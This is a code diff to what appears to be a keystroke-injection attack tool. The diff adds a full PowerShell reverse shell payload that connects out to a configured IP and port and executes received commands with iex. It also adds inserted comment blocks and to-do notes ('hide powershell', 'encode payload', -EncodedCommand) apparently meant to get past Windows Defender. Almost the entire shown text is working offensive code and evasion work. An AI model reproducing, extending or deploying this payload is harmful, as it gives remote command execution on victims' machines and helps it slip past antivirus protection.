@@ -15,11 +15,13 @@
     Enable the desired target operating system.
 
   To Do:
-    - Include Windows support !!! Currently blocked by defender
+    - Include Windows support
+      - hide powershell
+      - encode payload
 
   Author: NenshaM
   License: GPL v3
-  Version: 1.1.0
+  Version: 1.2.0
   ============================================================
 */
 
@@ -92,17 +94,31 @@ const char TERMINAL_CMD[] = "powershell";
 
 // Powershell reverse shell payload !!! Currently blocked by defender
 char* create_payload(void) {
-  char clearPayload[] = "$client = New-Object System.Net.Sockets.TCPClient('" IP_ADDR "'," PORT_NUM
-   ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
+  static char clearPayload[] = "$client = New-Object System.Net.Sockets.TCPClient('" IP_ADDR "'," PORT_NUM ");\n"
+    "$stream = $client.GetStream();\n"
+    "[byte[]]$bytes = 0..65535|%{0};\n"
+    "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;\n"
+      "$data = <# Some Fancy Comment#> (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i) <# Some Fancy Comment#> ;\n"
+      "$sendback = <# Some Fancy Comment#> (iex $data 2>&1 | Out-String ) <# Some Fancy Comment#> ;\n"
+      "$sendback2 = <# Some Fancy Comment#> $sendback + 'PS ' + (pwd).Path + '> ' <# Some Fancy Comment#> ;\n"
+      "$sendbyte = <# Some Fancy Comment#> ([text.encoding]::ASCII).GetBytes($sendback2) <# Some Fancy Comment#> ;\n"
+      "$stream.Write($sendbyte,0,$sendbyte.Length) <# Some Fancy Comment#> ;\n"
+      "$stream.Flush()\n"
+      "};\n"
+    "$client.Close()";
 
-  int clearPayloadLength = strlen(clearPayload);
-  // int encodedLength = Base64.encodedLength(clearPayloadLength);
+  // try:
+  // # Suppose your Base64 payload is in $PAYLOAD
+  // powershell.exe -NoProfile -EncodedCommand $PAYLOAD
 
-  // Dynamically allocate memory for the encoded string + "| base64 --decode"
-  char* payload = new char[clearPayloadLength+1];
-  strcpy(payload, clearPayload);
+  // int clearPayloadLength = strlen(clearPayload);
+  // // int encodedLength = Base64.encodedLength(clearPayloadLength);
 
-  return payload;
+  // // Dynamically allocate memory for the encoded string + "| base64 --decode"
+  // char* payload = new char[clearPayloadLength+1];
+  // strcpy(payload, clearPayload);
+
+  return clearPayload;
 }
 #endif
 
